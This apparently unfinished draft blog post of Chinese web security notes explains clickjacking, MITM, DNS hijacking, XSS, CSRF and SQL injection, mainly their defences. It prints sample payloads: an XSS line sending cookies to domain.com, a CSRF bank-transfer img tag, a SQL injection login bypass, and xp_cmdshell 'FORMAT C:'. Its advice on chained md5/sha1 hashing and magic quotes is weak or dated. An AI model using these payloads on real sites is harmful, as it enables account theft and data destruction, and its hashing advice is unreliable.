---
title: safety
date: 2020-11-21
draft: true
---

## 点击劫持

点击劫持是一种视觉欺骗的攻击手段。攻击者将需要攻击的网站通过 iframe 嵌套的方式嵌入自己的网页中，并将 iframe 设置为透明，在页面中透出一个按钮诱导用户点击。

对于这种攻击方式，推荐防御的方法有两种。

- X-FRAME-OPTIONS
- JS 防御

### X-FRAME-OPTIONS

`X-FRAME-OPTIONS` 是一个 HTTP 响应头，在现代浏览器有一个很好的支持。这个 HTTP 响应头 就是为了防御用 iframe 嵌套的点击劫持攻击。

该响应头有三个值可选，分别是

- `DENY`，表示页面不允许通过`iframe`的方式展示
- `SAMEORIGIN`，表示页面可以在相同域名下通过`iframe`的方式展示
- `ALLOW-FROM`，表示页面可以在指定来源的`iframe`中展示

### JS 防御

对于某些低版本浏览器来说，并不能支持上面的这种方式，那我们只有通过 JS 的方式来防御点击劫持了。

```html
<head>
  <style id="click-jack">
    html {
      display: none !important;
    }
  </style>
</head>
<body>
  <script>
    if (self == top) {
      var style = document.getElementById('click-jack');
      document.body.removeChild(style);
    } else {
      top.location = self.location;
    }
  </script>
</body>
```

## 中间人攻击

什么是中间人攻击？如何防范中间人攻击？

中间人攻击是攻击方同时与服务端和客户端建立起了连接，并让对方认为连接是安全的，但是实际上整个通信过程都被攻击者控制了。攻击者不仅能获得双方的通信信息，还能修改通信信息。

通常来说不建议使用公共的 Wi-Fi，因为很可能就会发生中间人攻击的情况。如果你在通信的过程中涉及到了某些敏感信息，就完全暴露给攻击方了。

当然防御中间人攻击其实并不难，只需要增加一个安全通道来传输信息。HTTPS 就可以用来防御中间人攻击，但是并不是说使用了 HTTPS 就可以高枕无忧了，因为如果你没有完全关闭 HTTP 访问的话，攻击方可以通过某些方式将 HTTPS 降级为 HTTP 从而实现中间人攻击。

## 密码安全

密码安全虽然大多是后端的事情，但是作为一名优秀的前端程序员也需要熟悉这方面的知识。

### 加盐

对于密码存储来说，必然是不能明文存储在数据库中的，否则一旦数据库泄露，会对用户造成很大的损失。并且不建议只对密码单纯通过加密算法加密，因为存在彩虹表的关系。

通常需要对密码加盐，然后进行几次不同加密算法的加密。

```js
// 加盐也就是给原密码添加字符串，增加原密码长度
sha256(sha1(md5(salt + password + salt)));
```

但是加盐并不能阻止别人盗取账号，只能确保即使数据库泄露，也不会暴露用户的真实密码。一旦攻击者得到了用户的账号，可以通过暴力破解的方式破解密码。对于这种情况，通常使用验证码增加延时或者限制尝试次数的方式。并且一旦用户输入了错误的密码，也不能直接提示用户输错密码，而应该提示账号或密码错误。

## 拒绝服务攻击

拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。

分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。

**DDoS**

攻击者在短时间内发起大量请求，利用协议的缺点，耗尽服务器的资源，导致网站无法响应正常的访问。

我之前也经历过，在这篇[《被 DDos 后的及时补救与一些思考》](https://godbmw.com/passages/2018-11-06-ddos-recover-and-think/)

防范的措施，或者称之为补救措施更合适，有以下建议：

1. 借助云厂商 CDN：静态流量的资源还得自己掏钱
2. IP 黑/白名单：`nginx` 和 `apache` 都可以设置
3. HTTP 请求信息：根据 UserAgent 等字段的信息
4. 静态化：博客网站直接挂在 github 等平台上
5. 备份网站：阮一峰老师的网站被 ddos 的时候就有个备份页面
6. 其他：弹性 ip、免费的 DNSpod、国内外分流、高防 ip 等等

### 简要介绍一下 DNS 劫持？

DNS 劫持的话是指在用户请求过程的域名解析中，分析请求的域名，返回假的 IP 地址，使用户访问的是假的网址。

### 简要介绍一下 DNS 污染？

### 如何防范 Web 前端攻击？

- 不要信任任何外部传入的数据

  - 针对用户输入作相关的格式检查、过滤等操作

- 不要信任在任何传入的第三方数据

  - 使用 CORS，设置 Access-Control-Allow-Origin

- 更安全地使用 Cookie

  - 设置 Cookie 为 HttpOnly，禁止了 JavaScript 操作 Cookie

- 防止网页被其他网站内嵌为 iframe
  - 服务器端设置 X-Frame-Options 响应头，防止页面被内嵌

### 如何应对流量劫持

利用各种恶意软件修改浏览器、锁定主页或不停弹出新窗口，强制用户访问某些网站，从而造成用户流量损失的情形。流量劫持是一种古老的攻击方式，比如早已见惯的广告弹窗(如下图)等，很多人已经对此麻木，并认为流量劫持不会造成什么损失。而事实上，流量劫持可以通过多种你无法觉察的方式窃取信息!
流量劫持的方式有很多种，常见的主要有 DNS 劫持、CDN 入侵、网关劫持、ARP 攻击、Hub 嗅探等等

##### 劫持实现的手段

域名劫持：通过劫持掉域名的 DNS 解析结果，将 HTTP 请求劫持到特定 IP 上，使得客户端和攻击者的服务器建立 TCP 连接，而不是和目标服务器直接连接，这样攻击者可以对内容进行窃取或篡改。在极端的情况下甚至攻击者可能伪造目标网站页面进行钓鱼攻击。

直接流量修改：在数据通路上对页面进行固定的内容插入，比如广告弹窗等。在这种情况下，虽然客户端和服务器是直接建立的连接，但是数据内容依然可能遭到野蛮破坏

#### 阻止劫持手段

##### 限制网站权限

部分网站遭遇劫持主要由于非法服务器获取了 Web 网站文件及文件夹的读写权限，针对这个问题，我们可以利用服务器的安全设置、提高网站程序的安全性，以此防范 Web 劫持。

##### 提升网站 防 SQL 注入功能

SQL 注入通过利用 SQL 语言的特性，向 Web 数据库写入内容，获取权限，因此我们需要针对 MS SQL Server 数据库中的小权限 sa 默认用户，建立一个只能访问本系统数据库的专一用户，并且为他配置最小权限。

##### 配置 Web 站点文件夹及其操作权限

使用 Windows 系统中的超级管理员权限对 Web 站点文件和文件夹进行权限配置。将大部分人的权限配置为仅读权限，黑客在没有写权限的情况下，很难将木马程序植入，减少网站域名劫持的可能性。

##### 定期清理 Web 网点中存在的可疑文件

不管黑客通过何种方式获取权限，在事件管理器中都会显示出异常情况，通过对异常事件和日期的分析，查看执行代码文件中是否被人注入代码或改动，并且对新增可执行代码进行清理。

##### 使用公共 114DNS

让用户绕过运营商 local DNS，使用 114 DNS（国内最大的中立缓存 DNS），这种在技术实现上有比较大的难度，成本也比较高。在现在的情况下即使用户使用公共 DNS，也并不能完全解决问题。先不论公共 DNS 是否也有在做劫持，最关键的是，运营商也会专门针对到公共 DNS 的流量做劫持。对于流量入口的把控，运营商不会放松警惕。

##### HttpDNS，防止 DNS 劫持

在移动客户端中加入一个域名解析模块，客户端通过 HTTP 的方式向网站的流量调度服务器请求 IP，流量调度服务器会根据用户所在位置给用户一个最优的 IP。客户端在获取 IP 后直接用此 IP 来访问所需站点资源
![image](https://user-images.githubusercontent.com/21194931/56857931-8695df00-69a5-11e9-801c-b69bc660ecc8.png)

##### HTTPS 防劫持

由于公共 DNS、HttpDNS 的部署成本过高，有一定的技术难度，并且在面对无孔不入的 DNS 劫持时难免会力有不逮。这时候网站开启 HTTPS 作为防流量劫持手段之一可以高效的解决这些问题。目前绝大部分网站也都已经启用 HTTPS 来加密。HTTPS 协议就是 HTTP+SSL/TLS，在 HTTP 的基础上加入 SSL /TLS 层，提供了内容加密、身份认证和数据完整性三大功能，最终目的就是为了加密数据，用于安全的数据传输
![image](https://user-images.githubusercontent.com/21194931/56857932-8dbced00-69a5-11e9-8e8a-5c0f1d0ad3b9.png)
![image](https://user-images.githubusercontent.com/21194931/56857935-91507400-69a5-11e9-9125-c3cf0108bdc8.png)

##### 如何快速启用 HTTPS

鉴于启用 HTTPS 会带来一定的服务器资源消耗，目前大多数公司普遍的选择是直接使用国内的 CDN 服务，比如又拍云提供一站式 HTTPS 服务，简单几步就能完成全站 HTTPS 的部署，光是免费类证书就有 2 款，而付费证书在 3-5 天内即可完成申购。另外一种可以直接在 Web 服务器上部署证书和私钥，可以去网上查看教程。

#### 总结

面对 Web 流量劫持，首先我们可以在网站层面限制读写权限，限制恶意代码的写入，其次可以通过公有 DNS 和 HttpDNS 来防止恶意 DNS 劫持。全站开启 HTTPS，加密数据传输，可以有效防止数据泄漏，同时解决流量劫持的问题

### 接口如何防刷

referer 校验
UA 校验
频率限制（1s 内接口调用次数限制）
把某个 key 加配料，带上时间戳，加密，请求时带上，过期或解密失败则 403。

### Web 攻击技术

#### 攻击模式

##### 1. 主动攻击

直接攻击服务器，具有代表性的有 SQL 注入和 OS 命令注入。

##### 2. 被动攻击

设下圈套，让用户发送有攻击代码的 HTTP 请求，用户会泄露 Cookie 等个人信息，具有代表性的有跨站脚本攻击和跨站请求伪造。

#### 跨站脚本攻击

##### 1. 概念

跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和 Cookie 等各种内容。

例如有一个论坛网站，攻击者可以在上面发表以下内容：

```
<script>location.href="//domain.com/?c=" + document.cookie</script>
```

之后该内容可能会被渲染成以下形式：

```
<p><script>location.href="//domain.com/?c=" + document.cookie</script></p>
```

另一个用户浏览了含有这个内容的页面将会跳往 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。

##### 2. 危害

- 伪造虚假的输入表单骗取个人信息
- 窃取用户的 Cookie 值
- 显示伪造的文章或者图片

##### 3. 防范手段

（一）过滤特殊字符

许多语言都提供了对 HTML 的过滤：

- PHP 的 htmlentities() 或是 htmlspecialchars()。
- Python 的 cgi.escape()。
- Java 的 xssprotect (Open Source Library)。
- Node.js 的 node-validator。

（二）指定 HTTP 的 Content-Type

通过这种方式，可以避免内容被当成 HTML 解析，比如 PHP 语言可以使用以下代码：

```php
<?php
   header('Content-Type: text/javascript; charset=utf-8');
?>
```

#### 跨站攻击

- CSRF（Cross-site request forgery，跨站请求伪造）

  CSRF(XSRF) 顾名思义，是伪造请求，冒充用户在站内的正常操作。

  例如，一论坛网站的发贴是通过 GET 请求访问，点击发贴之后 JS 把发贴内容拼接成目标 URL 并访问：

        http://example.com/bbs/create_post.php?title=标题&content=内容

  那么，我们只需要在论坛中发一帖，包含一链接：

        http://example.com/bbs/create_post.php?title=我是脑残&content=哈哈

只要有用户点击了这个链接，那么他们的帐户就会在不知情的情况下发布了这一帖子。可能这只是个恶作剧，但是既然发贴的请求可以伪造，那么删帖、转帐、改密码、发邮件全都可以伪造。

**如何防范 CSRF 攻击**？可以注意以下几点：

- 关键操作只接受 POST 请求

- 验证码

  CSRF 攻击的过程，往往是在用户不知情的情况下构造网络请求。所以如果使用验证码，那么每次操作都需要用户进行互动，从而简单有效的防御了 CSRF 攻击。

  但是如果你在一个网站作出任何举动都要输入验证码会严重影响用户体验，所以验证码一般只出现在特殊操作里面，或者在注册时候使用。

- 检测 Referer

  常见的互联网页面与页面之间是存在联系的，比如你在 `www.baidu.com` 应该是找不到通往`www.google.com` 的链接的，再比如你在论坛留言，那么不管你留言后重定向到哪里去了，之前的那个网址一定会包含留言的输入框，这个之前的网址就会保留在新页面头文件的 `Referer` 中

通过检查 `Referer` 的值，我们就可以判断这个请求是合法的还是非法的，但是问题出在服务器不是任何时候都能接受到 `Referer` 的值，所以 Referer Check 一般用于监控 CSRF 攻击的发生，而不用来抵御攻击。

- Token

  目前主流的做法是使用 Token 抵御 CSRF 攻击。下面通过分析 CSRF 攻击来理解为什么 Token 能够有效

  CSRF 攻击要成功的条件在于攻击者能够预测所有的参数从而构造出合法的请求。所以根据不可预测性原则，我们可以对参数进行加密从而防止 CSRF 攻击。

  另一个更通用的做法是保持原有参数不变，另外添加一个参数 Token，其值是随机的。这样攻击者因为不知道 Token 而无法构造出合法的请求进行攻击。

Token 使用原则

      * Token 要足够随机————只有这样才算不可预测
      * Token 是一次性的，即每次请求成功后要更新Token————这样可以增加攻击难度，增加预测难度
      * Token 要注意保密性————敏感操作使用 post，防止 Token 出现在 URL 中

**注意**：过滤用户输入的内容**不能**阻挡 csrf，我们需要做的是过滤请求的**来源**。

- XSS（Cross Site Scripting，跨站脚本攻击）

  XSS 全称“跨站脚本”，是注入攻击的一种。其特点是不对服务器端造成任何伤害，而是通过一些正常的站内交互途径，例如发布评论，提交含有 JavaScript 的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。

  运行预期之外的脚本带来的后果有很多中，可能只是简单的恶作剧——一个关不掉的窗口：

        while (true) {
            alert("你关不掉我~");
        }

  也可以是盗号或者其他未授权的操作。

  XSS 是实现 CSRF 的诸多途径中的一条，但绝对不是唯一的一条。一般习惯上把通过 XSS 来实现的 CSRF 称为 XSRF。

  **如何防御 XSS 攻击？**

  理论上，所有可输入的地方没有对输入数据进行处理的话，都会存在 XSS 漏洞，漏洞的危害取决于攻击代码的威力，攻击代码也不局限于 script。防御 XSS 攻击最简单直接的方法，就是过滤用户的输入。

  如果不需要用户输入 HTML，可以直接对用户的输入进行 HTML escape 。下面一小段脚本：

        <script>window.location.href=”http://www.baidu.com”;</script>

经过 escape 之后就成了：

        &lt;script&gt;window.location.href=&quot;http://www.baidu.com&quot;&lt;/script&gt;

它现在会像普通文本一样显示出来，变得无毒无害，不能执行了。

当我们需要用户输入 HTML 的时候，需要对用户输入的内容做更加小心细致的处理。仅仅粗暴地去掉 script 标签是没有用的，任何一个合法 HTML 标签都可以添加 onclick 一类的事件属性来执行 JavaScript。更好的方法可能是，将用户的输入使用 HTML 解析库进行解析，获取其中的数据。然后根据用户原有的标签属性，重新构建 HTML 元素树。构建的过程中，所有的标签、属性都只从**白名单**中拿取。

#### 跨站点请求伪造

##### 1. 概念

跨站点请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了 Web 中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。

XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。

假如一家银行用以执行转账操作的 URL 地址如下：

```
http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName。
```

那么，一个恶意攻击者可以在另一个网站上放置如下代码：

```
<img src="http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman">。
```

如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 资金。

这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。

透过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。

##### 2. 防范手段

（一）检查 Referer 字段

HTTP 头中有一个 Referer 字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer 字段应和请求的地址位于同一域名下。

这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。

（二）添加校验 Token

由于 CSRF 的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行 CSRF 攻击。这种数据通常是表单中的一个数据项。服务器将其生成并附加在表单中，其内容是一个伪乱数。当客户端通过表单提交请求时，这个伪乱数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪乱数，而通过 CSRF 传来的欺骗性攻击中，攻击者无从事先得知这个伪乱数的值，服务器端就会因为校验 Token 的值为空或者错误，拒绝这个可疑请求。

#### SQL 注入攻击

##### 1. 概念

服务器上的数据库运行非法的 SQL 语句。

##### 2. 攻击原理

例如一个网站登录验证的 SQL 查询代码为：

```sql
strSQL = "SELECT * FROM users WHERE (name = '" + userName + "') and (pw = '"+ passWord +"');"
```

如果填入以下内容：

```sql
userName = "1' OR '1'='1";
passWord = "1' OR '1'='1";
```

那么 SQL 查询字符串为：

```sql
strSQL = "SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');"
```

此时无需验证通过就能执行以下查询：

```sql
strSQL = "SELECT * FROM users;"
```

##### 3. 危害

- 数据表中的数据外泄，例如个人机密数据，账户数据，密码等。
- 数据结构被黑客探知，得以做进一步攻击（例如 SELECT \* FROM sys.tables）。
- 数据库服务器被攻击，系统管理员账户被窜改（例如 ALTER LOGIN sa WITH PASSWORD='xxxxxx'）。
- 获取系统较高权限后，有可能得以在网页加入恶意链接、恶意代码以及 XSS 等。
- 经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统（例如 xp_cmdshell "net stop iisadmin" 可停止服务器的 IIS 服务）。
- 破坏硬盘数据，瘫痪全系统（例如 xp_cmdshell "FORMAT C:"）。

##### 4. 防范手段

- 在设计应用程序时，完全使用参数化查询（Parameterized Query）来设计数据访问功能。
- 在组合 SQL 字符串时，先针对所传入的参数作字符取代（将单引号字符取代为连续 2 个单引号字符）。
- 如果使用 PHP 开发网页程序的话，亦可打开 PHP 的魔术引号（Magic quote）功能（自动将所有的网页传入参数，将单引号字符取代为连续 2 个单引号字符）。
- 其他，使用其他更安全的方式连接 SQL 数据库。例如已修正过 SQL 注入问题的数据库连接组件，例如 ASP.NET 的 SqlDataSource 对象或是 LINQ to SQL。
- 使用 SQL 防注入系统。

#### 拒绝服务攻击

##### 1. 概念

拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。

分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用网络上两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。

> [维基百科：拒绝服务攻击](https://zh.wikipedia.org/wiki/%E9%98%BB%E6%96%B7%E6%9C%8D%E5%8B%99%E6%94%BB%E6%93%8A)
